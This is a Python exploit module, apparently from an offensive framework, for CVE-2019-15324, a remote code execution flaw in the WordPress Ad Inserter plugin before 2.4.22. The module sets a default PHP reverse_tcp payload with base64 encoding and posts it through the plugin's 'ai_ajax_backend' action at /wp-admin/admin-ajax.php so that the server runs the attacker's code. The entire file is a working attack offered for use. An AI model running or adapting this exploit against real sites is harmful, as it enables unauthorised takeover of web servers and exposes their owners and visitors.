from deathnote_module import *
from lib.http.http_client import Http_client

class Module(Exploit, Http_client):

    __info__ = {
        "name": "Wordpress Plugin Ad Inserter rce",
        "description": "The ad-inserter plugin before 2.4.22 for WordPress has remote code execution.",
        "cve": "2019-15324",
        "payload": {
            "default": "payloads/singles/php/reverse_tcp",
            "arch": "php",
            "platform": "php",
            "category": "singles",
            "encoder": "encoders/php/base64"
            }
    }	
    
    def run(self):
        
        data = {
                "action": "ai_ajax_backend",
                "preview": 1,
                "ai_check": "",
                "code": self.payload,
                "php": 1
        }
        
        r = self.http_request(
                        method="POST",
                        path="/wp-admin/admin-ajax.php",
                        data=data
        )

        if not r:
            self.not_vulnerable()